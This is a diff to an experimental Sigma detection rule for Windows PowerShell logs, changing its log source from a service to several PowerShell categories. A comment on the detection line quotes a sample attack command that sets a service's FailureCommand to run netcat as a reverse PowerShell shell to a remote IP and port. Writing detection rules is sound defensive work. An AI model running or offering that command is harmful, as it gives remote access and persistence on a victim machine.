@@ -12,7 +12,10 @@ author: mdecrevoisier
 status: experimental
 logsource:
   product: windows
-  service: powershell
+  category:
+    - ps_module
+    - ps_classic_script
+    - ps_script
 detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
   selection_powershell_native:
     EventID: 800
